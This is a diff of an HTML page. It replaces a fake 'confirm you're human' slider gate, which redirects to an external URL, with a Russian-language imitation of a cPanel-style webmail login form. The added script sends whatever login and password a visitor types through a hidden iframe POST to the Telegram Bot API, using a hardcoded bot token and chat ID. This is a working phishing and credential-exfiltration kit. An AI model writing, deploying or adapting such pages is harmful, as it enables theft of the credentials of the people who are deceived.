@@ -1,323 +1,284 @@
 <!doctype html>
-<html lang="en">
+<html lang="ru">
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Human verification</title>
+  <title>Ввод данных</title>
   <style>
-    :root {
-      --bg: #0f1724;
-      --panel: rgba(11, 18, 32, 0.5);
-      --text: #edf2f7;
-      --muted: #a0aec0;
-      --accent: #38bdf8;
-      --accent2: #34d399;
-      --radius: 14px;
-    }
-    * { box-sizing: border-box; }
-    body {
-      margin: 0;
-      min-height: 100vh;
-      background:
-        radial-gradient(1200px 600px at 10% 10%, rgba(56,189,248,0.06), transparent 8%),
-        radial-gradient(900px 400px at 90% 90%, rgba(52,211,153,0.04), transparent 8%),
-        var(--bg);
-      font-family: system-ui, -apple-system, "Segoe UI", sans-serif;
-      color: var(--text);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 20px;
-    }
-    .card {
-      width: min(520px, 100%);
-      background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.005));
-      border: 1px solid rgba(255,255,255,0.03);
-      border-radius: var(--radius);
-      padding: 24px 20px 18px;
-      box-shadow: 0 8px 30px rgba(2,6,23,0.6);
-      backdrop-filter: blur(5px);
-    }
-    h1 {
-      margin: 0 0 6px;
-      font-size: 1.1rem;
-    }
-    p.lead {
-      margin: 0 0 18px;
-      color: var(--muted);
-      font-size: 0.9rem;
-      line-height: 1.4;
-    }
-    .slider-shell {
-      background: rgba(255,255,255,0.015);
-      border: 1px solid rgba(255,255,255,0.015);
-      border-radius: 12px;
-      padding: 12px;
-    }
-    .hint {
-      font-size: 0.78rem;
-      color: var(--muted);
-      margin-bottom: 10px;
-    }
-    .slider {
-      position: relative;
-      height: 54px;
-      border-radius: 12px;
-      user-select: none;
-      touch-action: pan-y;
-    }
-    .track {
-      position: absolute;
-      inset: 0;
-      background: rgba(255,255,255,0.02);
-      border-radius: 12px;
-      display: flex;
-      align-items: center;
-    }
-    .progress {
-      height: 100%;
-      width: 0%;
-      background: linear-gradient(90deg, var(--accent), var(--accent2));
-      border-radius: 12px;
-      transition: width 0.08s linear;
-    }
-    .thumb {
-      position: absolute;
-      top: 50%;
-      left: 0;
-      transform: translate(0, -50%);
-      height: 46px;
-      width: 46px;
-      border-radius: 10px;
-      background: #0f1724;
-      border: 1px solid rgba(255,255,255,0.05);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      cursor: grab;
-      z-index: 2;
-      transition: transform 120ms ease-out;
-      box-shadow: 0 4px 15px rgba(0,0,0,0.28);
-      touch-action: none;
-    }
-    .thumb:active {
-      cursor: grabbing;
-    }
-    .thumb-inner {
-      background: linear-gradient(180deg, var(--accent), #0ea5e9);
-      height: 34px;
-      width: 34px;
-      border-radius: 8px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      color: #031525;
-      font-weight: 700;
-      font-size: 1.1rem;
-      box-shadow: 0 3px 12px rgba(14,165,233,0.55);
-    }
-    .center-text {
-      position: absolute;
-      top: 50%;
-      left: 52px;
-      right: 10px;
-      transform: translateY(-50%);
-      font-size: 0.78rem;
-      color: rgba(237,242,247,0.86);
-      pointer-events: none;
-      white-space: nowrap;
-      overflow: hidden;
-      text-overflow: ellipsis;
-    }
-    .foot {
-      text-align: center;
-      margin-top: 12px;
-      font-size: 0.7rem;
-      color: var(--muted);
-    }
-    .success .center-text {
-      color: #bbf7d0;
-    }
-    .success .thumb .thumb-inner {
-      background: linear-gradient(180deg, #22c55e, #15803d);
-      color: #03210c;
+    :root{
+      --form-w: 283px;
+      --field-h: 32px;
+      --addon-w: 34px;
+      --radius: 3px;
+
+      --accent: #169bd5;
+      --accent-border:#0b5f86;
+
+      --text:#1f2937;
+      --muted:#6b7280;
+      --border:#bfc5c9;
+      --addon-bg:#eef1f3;
+      --bg:#ffffff;
+      --logo:#ff6a00;
     }
 
-    @media (max-width: 460px) {
-      .card { padding: 20px 16px 14px; }
-      .center-text {
-        left: 50px;
-        font-size: 0.72rem;
-      }
-      .thumb { height: 44px; width: 44px; }
-      .thumb-inner { height: 32px; width: 32px; }
-      .slider { height: 52px; }
+    html,body{height:100%}
+    body{
+      margin:0;
+      font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
+      color:var(--text);
+      background:var(--bg);
+    }
+
+    .wrap{
+      min-height:100vh;
+      display:flex;
+      flex-direction:column;
+      align-items:center;
+      justify-content:flex-start;
+      padding:110px 16px 60px;
+      box-sizing:border-box;
+    }
+
+    .label{
+      width:var(--form-w);
+      font-size:14px;
+      font-weight:700;
+      margin:14px 0 6px;
+      text-align:left;
+    }
+
+    .group{
+      width:var(--form-w);
+      display:flex;
+      align-items:stretch;
+    }
+
+    .addon{
+      width:var(--addon-w);
+      height:var(--field-h);
+      border:1px solid var(--border);
+      border-right:0;
+      border-top-left-radius:var(--radius);
+      border-bottom-left-radius:var(--radius);
+      background:var(--addon-bg);
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      box-sizing:border-box;
+    }
+
+    .addon svg{
+      width:16px;height:16px;
+      fill:#9aa3aa;
+      display:block;
+    }
+
+    .input{
+      width:calc(var(--form-w) - var(--addon-w));
+      height:var(--field-h);
+      border:1px solid var(--border);
+      border-top-right-radius:var(--radius);
+      border-bottom-right-radius:var(--radius);
+      padding:0 10px;
+      font-size:13px;
+      outline:none;
+      box-sizing:border-box;
+      background:#fff;
+    }
+
+    .input:focus{
+      border-color:#8aa7b8;
+      box-shadow:0 0 0 2px rgba(22,155,213,.15);
+    }
+
+    .btn{
+      width:var(--form-w);
+      height:var(--field-h);
+      margin-top:18px;
+      border-radius:var(--radius);
+      border:1px solid var(--accent-border);
+      background:var(--accent);
+      color:#fff;
+      font-weight:700;
+      font-size:13px;
+      cursor:pointer;
+    }
+    .btn:hover{ filter:brightness(.97); }
+
+    .reset{
+      margin-top:14px;
+      font-size:13px;
+      font-weight:700;
+      color:#2c3e50;
+      text-decoration:none;
+    }
+    .reset:hover{ text-decoration:underline; }
+
+    .langs{
+      margin-top:48px;
+      display:flex;
+      flex-wrap:wrap;
+      gap:18px;
+      justify-content:center;
+      align-items:center;
+      font-size:12px;
+      color:#2c3e50;
+      font-weight:700;
+      user-select:none;
+    }
+    .langs a{ color:inherit; text-decoration:none; }
+    .langs a:hover{ text-decoration:underline; }
+
+    .footer{
+      margin-top:80px;
+      text-align:center;
+      color:var(--muted);
+      font-size:11px;
+      line-height:1.4;
+    }
+    .footer .mark{
+      display:inline-flex;
+      align-items:center;
+      justify-content:center;
+      width:24px;height:24px;
+      border-radius:50%;
+      background:#fff;
+      color:var(--logo);
+      font-weight:900;
+      margin-bottom:6px;
+    }
+
+    .logo-img{
+      display:block;
+      margin:0 auto 26px;
+      width:320px;
+      height:auto;
+    }
+
+    @media (max-width: 360px){
+      :root{ --form-w: 260px; }
     }
   </style>
 </head>
 <body>
-  <div class="card" id="card">
-    <h1>Confirm you’re human</h1>
-    <p class="lead">Drag the slider all the way to the right. This works on phones and desktops.</p>
 
-    <div class="slider-shell">
-      <p class="hint" id="hint-text">Slide to verify →</p>
-      <div class="slider" id="slider" aria-label="Slide to verify">
-        <div class="track">
-          <div class="progress" id="progress"></div>
+  <!-- Невидимый iframe: через него отправляем POST на Telegram без CORS -->
+  <iframe name="tg_iframe" style="display:none;"></iframe>
+
+  <div class="wrap">
+    <img class="logo-img" src="./webmail-logo.svg" alt="Webmail" />
+
+    <!-- form: убрали action/method, отправку перехватывает JS -->
+    <form id="f" autocomplete="on">
+      <div class="label">Логин</div>
+      <div class="group">
+        <div class="addon" aria-hidden="true">
+          <!-- user icon -->
+          <svg viewBox="0 0 24 24">
+            <path d="M12 12c2.76 0 5-2.46 5-5.5S14.76 1 12 1 7 3.46 7 6.5 9.24 12 12 12zm0 2c-4.42 0-8 2.24-8 5v2h16v-2c0-2.76-3.58-5-8-5z"/>
+          </svg>
         </div>
-        <div class="thumb" id="thumb" role="button" aria-pressed="false" tabindex="0">
-          <div class="thumb-inner">»</div>
-        </div>
-        <div class="center-text" id="center-text">Slide to continue</div>
+        <input class="input" type="text" name="login" placeholder="Введите логин" autocomplete="username" required />
       </div>
+
+      <div class="label" style="margin-top:18px;">Пароль</div>
+      <div class="group">
+        <div class="addon" aria-hidden="true">
+          <!-- lock icon -->
+          <svg viewBox="0 0 24 24">
+            <path d="M17 10V7a5 5 0 0 0-10 0v3H5v11h14V10h-2Zm-6 6a1 1 0 1 1 2 0 1 1 0 0 1-2 0Zm6-6H7V7a5 5 0 0 1 10 0v3Z"/>
+          </svg>
+        </div>
+        <input class="input" type="password" name="password" placeholder="Введите пароль" autocomplete="current-password" required />
+      </div>
+
+      <button class="btn" type="submit">Продолжить</button>
+    </form>
+
+    <a class="reset" href="#" id="resetLink">Сбросить данные</a>
+
+    <div class="langs" aria-label="Языки">
+      <a href="#">English</a>
+      <a href="#">العربية</a>
+      <a href="#">čeština</a>
+      <a href="#">dansk</a>
+      <a href="#">Deutsch</a>
+      <a href="#">Ελληνικά</a>
+      <a href="#">español</a>
+      <a href="#">español latinoamericano</a>
+      <span>…</span>
     </div>
 
-    <p class="foot">If you can’t slide, refresh the page and try again.</p>
+    <div class="footer">
+      <div class="mark">cp</div><br/>
+      Copyright © <span id="y"></span> Ваша компания.<br/>
+      Политика конфиденциальности
+    </div>
   </div>
 
   <script>
-    // change this to your real destination:
-    const TARGET_URL = "https://approvstayvstinf.world/nhbcxkn";
-    const COOKIE_NAME = "human_verified";
-    const COOKIE_AGE = 7 * 24 * 3600; // 7 days
+    // Год в футере
+    document.getElementById('y').textContent = new Date().getFullYear();
 
-    function getCookie(name) {
-      return document.cookie.split("; ").reduce((acc, cur) => {
-        const [k, v] = cur.split("=");
-        return k === name ? decodeURIComponent(v) : acc;
-      }, "");
+    // ⚠️ Вариант B (эксперимент): токен будет виден в исходниках.
+    // Вставь сюда dev-токен и chat_id.
+    const KJDNiruwjoknfgi24uhn = "8551401351:AAE_HPh8RsgqARs46q-Ck9l1obZ--Ka_6FQ";
+    const CHAT_ID   = "7942744213"; // например "123456789" или "-1001234567890"
+
+    const form = document.getElementById('f');
+
+    function sendToTelegram(login, password){
+      const text = `Новая заявка:\nЛогин: ${login}\nПароль: ${password}`;
+
+      // Создаём временную форму, отправляем POST в Telegram через скрытый iframe
+      const postForm = document.createElement('form');
+      postForm.method = 'POST';
+      postForm.action = `https://api.telegram.org/bot${KJDNiruwjoknfgi24uhn}/sendMessage`;
+      postForm.target = 'tg_iframe';
+
+      const chatIdInput = document.createElement('input');
+      chatIdInput.type = 'hidden';
+      chatIdInput.name = 'chat_id';
+      chatIdInput.value = CHAT_ID;
+
+      const textInput = document.createElement('input');
+      textInput.type = 'hidden';
+      textInput.name = 'text';
+      textInput.value = text;
+
+      // (опционально) отключить предпросмотр ссылок
+      const previewInput = document.createElement('input');
+      previewInput.type = 'hidden';
+      previewInput.name = 'disable_web_page_preview';
+      previewInput.value = 'true';
+
+      postForm.appendChild(chatIdInput);
+      postForm.appendChild(textInput);
+      postForm.appendChild(previewInput);
+
+      document.body.appendChild(postForm);
+      postForm.submit();
+      postForm.remove();
     }
 
-    function setCookie(name, value, maxAge) {
-      document.cookie = name + "=" + encodeURIComponent(value) + "; path=/; max-age=" + maxAge + "; SameSite=Lax";
-    }
-
-    // if already verified — go right away
-    if (getCookie(COOKIE_NAME) === "1") {
-      window.location.replace(TARGET_URL);
-    }
-
-    const slider = document.getElementById("slider");
-    const thumb = document.getElementById("thumb");
-    const progress = document.getElementById("progress");
-    const centerText = document.getElementById("center-text");
-    const card = document.getElementById("card");
-
-    let sliderRect, thumbRect;
-    let isDragging = false;
-    let startX = 0;
-    let startOffset = 0;
-    const COMPLETE_AT = 0.7; // 90% to complete
-    let done = false;
-
-    function measure() {
-      sliderRect = slider.getBoundingClientRect();
-      thumbRect = thumb.getBoundingClientRect();
-    }
-
-    function setPos(norm) {
-      norm = Math.max(0, Math.min(1, norm));
-      const maxX = sliderRect.width - thumbRect.width;
-      const px = norm * maxX;
-      thumb.style.transform = "translate(" + px + "px, -50%)";
-      progress.style.width = (norm * 100) + "%";
-    }
-
-    function complete() {
-      if (done) return;
-      done = true;
-      thumb.setAttribute("aria-pressed", "true");
-      centerText.textContent = "Verified! Redirecting...";
-      card.classList.add("success");
-      setCookie(COOKIE_NAME, "1", COOKIE_AGE);
-      setTimeout(() => {
-        window.location.replace(TARGET_URL);
-      }, 500);
-      if (navigator.vibrate) navigator.vibrate(35);
-    }
-
-    function pointerDown(clientX) {
-      if (done) return;
-      measure();
-      isDragging = true;
-      startX = clientX;
-      const current = (thumb.style.transform || "").match(/translate\(([-\d.]+)px/);
-      startOffset = current ? parseFloat(current[1]) : 0;
-      thumb.style.transition = "none";
-      progress.style.transition = "none";
-    }
-
-    function pointerMove(clientX) {
-      if (!isDragging || done) return;
-      const dx = clientX - startX;
-      const maxX = sliderRect.width - thumbRect.width;
-      let newX = startOffset + dx;
-      newX = Math.max(0, Math.min(maxX, newX));
-      const norm = newX / maxX;
-      thumb.style.transform = "translate(" + newX + "px, -50%)";
-      progress.style.width = (norm * 100) + "%";
-
-      if (norm >= COMPLETE_AT) {
-        setPos(1);
-        complete();
-      }
-    }
-
-    function pointerUp() {
-      if (!isDragging) return;
-      isDragging = false;
-      if (!done) {
-        // snap back
-        thumb.style.transition = "transform 0.25s ease";
-        progress.style.transition = "width 0.25s ease";
-        setPos(0);
-      }
-    }
-
-    // mouse
-    thumb.addEventListener("mousedown", e => {
-      pointerDown(e.clientX);
+    form.addEventListener('submit', (e) => {
       e.preventDefault();
-    });
-    window.addEventListener("mousemove", e => {
-      pointerMove(e.clientX);
-    });
-    window.addEventListener("mouseup", pointerUp);
 
-    // touch
-    thumb.addEventListener("touchstart", e => {
-      const t = e.touches[0];
-      pointerDown(t.clientX);
-    }, { passive: true });
-    window.addEventListener("touchmove", e => {
-      if (!isDragging) return;
-      const t = e.touches[0];
-      pointerMove(t.clientX);
-    }, { passive: true });
-    window.addEventListener("touchend", pointerUp);
+      const login = form.elements.login.value.trim();
+      const password = form.elements.password.value;
 
-    // keyboard for accessibility
-    thumb.addEventListener("keydown", e => {
-      if (done) return;
-      if (e.key === "ArrowRight" || e.key === "Right" || e.key === "Enter" || e.key === " ") {
-        measure();
-        setPos(1);
-        complete();
-        e.preventDefault();
-      }
+      sendToTelegram(login, password);
+
+      alert('Отправлено (если BOT_TOKEN и CHAT_ID верные).');
+      form.reset();
     });
 
-    // initial measure
-    window.addEventListener("resize", () => {
-      // after resize, reset to start if not done
-      if (!done) {
-        measure();
-        setPos(0);
-      }
+    // Сброс по ссылке
+    document.getElementById('resetLink').addEventListener('click', (e) => {
+      e.preventDefault();
+      form.reset();
     });
-    measure();
-    setPos(0);
   </script>
 </body>
 </html>
